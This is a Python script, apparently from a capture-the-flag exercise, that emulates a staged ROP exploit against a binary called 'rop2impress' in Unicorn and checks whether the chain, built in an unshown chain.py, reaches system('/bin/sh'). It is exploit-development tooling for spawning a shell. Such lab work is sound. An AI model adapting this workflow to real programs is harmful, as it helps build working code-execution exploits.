#!/usr/bin/env python3
"""Full-flow Unicorn emulation of rop2impress using chain.py layout."""
import struct
from unicorn import *
from unicorn.x86_const import *
import chain as C

BIN = open('main','rb').read()
LIBC_BASE = 0x7f0000000000

mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(0x401000, 0x1000)
mu.mem_write(0x401000, BIN[0x3000:0x3000+0x179])
mu.mem_map(0x403000, 0x1000)
mu.mem_write(C.GOT_READ, struct.pack('<Q', LIBC_BASE + C.OFF_READ))
mu.mem_map(LIBC_BASE, 0x200000)  # whole libc span (covers pop_rdi, binsh, read, system)
# fake read fast path with syscall at +0xf
buf = bytearray(b'\x90'*0x20)
buf[0x00:0x04] = bytes.fromhex('f30f1efa')
buf[0x0d:0x0f] = b'\x31\xc0'
buf[0x0f:0x11] = b'\x0f\x05'
buf[0x11:0x17] = b'\x48\x3d\x00\xf0\xff\xff'
buf[0x17:0x19] = b'\x77\x05'
buf[0x19:0x1a] = b'\xc3'
mu.mem_write(LIBC_BASE + C.OFF_READ, bytes(buf))
# fake system / pop_rdi / binsh so we can detect success
# pop rdi; ret at OFF_POP_RDI
mu.mem_write(LIBC_BASE + C.OFF_POP_RDI, b'\x5f\xc3')
mu.mem_write(LIBC_BASE + C.OFF_BINSH, b'/bin/sh\x00')
# system: we place an int3-like marker; detect by hooking execution there
SYSTEM = LIBC_BASE + C.OFF_SYSTEM
mu.mem_write(SYSTEM, b'\xc3')  # ret (we'll detect reaching it)

STACK = 0x7ffff0000000
mu.mem_map(STACK, 0x200000)
rsp0 = STACK + 0x100000

inputs = []
outputs = []
reached_system = {'ok': False, 'rdi': None}

def hook_syscall(mu, u):
    rax = mu.reg_read(UC_X86_REG_RAX)
    rdi = mu.reg_read(UC_X86_REG_RDI)
    rsi = mu.reg_read(UC_X86_REG_RSI)
    rdx = mu.reg_read(UC_X86_REG_RDX)
    if rax == 0:
        c = inputs.pop(0) if inputs else b''
        c = c[:rdx]
        mu.mem_write(rsi, c)
        mu.reg_write(UC_X86_REG_RAX, len(c))
        print(f"    read(fd={rdi},{rsi:#x},{rdx:#x}) <- {len(c)}B {c[:12].hex()}")
    elif rax == 1:
        data = bytes(mu.mem_read(rsi, rdx))
        outputs.append(data)
        mu.reg_write(UC_X86_REG_RAX, rdx)
        print(f"    write(fd={rdi},{rsi:#x},{rdx:#x}) -> LEAK {data[:12].hex()}")
    else:
        print(f"    syscall?? rax={rax:#x}")
        mu.reg_write(UC_X86_REG_RAX, (1<<64)-14)
mu.hook_add(UC_HOOK_INSN, hook_syscall, None, 1, 0, UC_X86_INS_SYSCALL)

names = {0x401139:'CALL_READ',0x401030:'read@plt',0x4010cf:'RAX_ZERO',
         0x40112c:'POP_RSP',0x40112f:'POP_RBP',0x401016:'RET',0x401131:'rop()',
         0x40114f:'ret_in'}
cnt = {'n':0}
def hook_code(mu, addr, size, u):
    cnt['n'] += 1
    if cnt['n'] > 600:
        print("step limit"); mu.emu_stop(); return
    if addr == SYSTEM:
        rdi = mu.reg_read(UC_X86_REG_RDI)
        rsp = mu.reg_read(UC_X86_REG_RSP)
        reached_system['ok'] = True; reached_system['rdi'] = rdi
        print(f"    *** reached system() rdi={rdi:#x} rsp={rsp:#x} rsp%16={rsp%16} "
              f"({'=/bin/sh' if rdi==LIBC_BASE+C.OFF_BINSH else '??'}) ***")
        mu.emu_stop(); return
    tag = names.get(addr,'')
    if tag:
        rsp=mu.reg_read(UC_X86_REG_RSP); rbp=mu.reg_read(UC_X86_REG_RBP); rax=mu.reg_read(UC_X86_REG_RAX)
        print(f"[{cnt['n']:3d}] {addr:#x} {tag:10s} rsp={rsp:#x} rbp={rbp:#x} rax={rax:#x}")
mu.hook_add(UC_HOOK_CODE, hook_code)
def hook_inv(mu, access, addr, size, val, u):
    rip=mu.reg_read(UC_X86_REG_RIP)
    print(f"    INVALID access={access} addr={addr:#x} rip={rip:#x}")
    return False
mu.hook_add(UC_HOOK_MEM_READ_UNMAPPED|UC_HOOK_MEM_WRITE_UNMAPPED|UC_HOOK_MEM_FETCH_UNMAPPED, hook_inv)

# Build inputs: stage0 is consumed by rop()'s own read; stage1 by CALL_READ#1;
# stage2 (1 byte) by CALL_READ#2; then driver read1 (1 byte); then final payload.
LIBC_FOR_FINAL = LIBC_BASE
inputs = [C.stage0(), C.stage1(), C.stage2_byte(), C.driver_read1_byte(),
          C.final_payload(LIBC_FOR_FINAL)]

# start at rop()
rsp = rsp0 - 8
mu.mem_write(rsp, struct.pack('<Q', 0x401160))
mu.reg_write(UC_X86_REG_RSP, rsp)
mu.reg_write(UC_X86_REG_RBP, rsp0 + 0x200)
try:
    mu.emu_start(0x401131, 0, count=0)
except UcError as e:
    print(f"    UcError {e} rip={mu.reg_read(UC_X86_REG_RIP):#x}")

print("outputs:", [o[:16].hex() for o in outputs])
print("SUCCESS" if reached_system['ok'] and reached_system['rdi']==LIBC_BASE+C.OFF_BINSH else "FAIL")
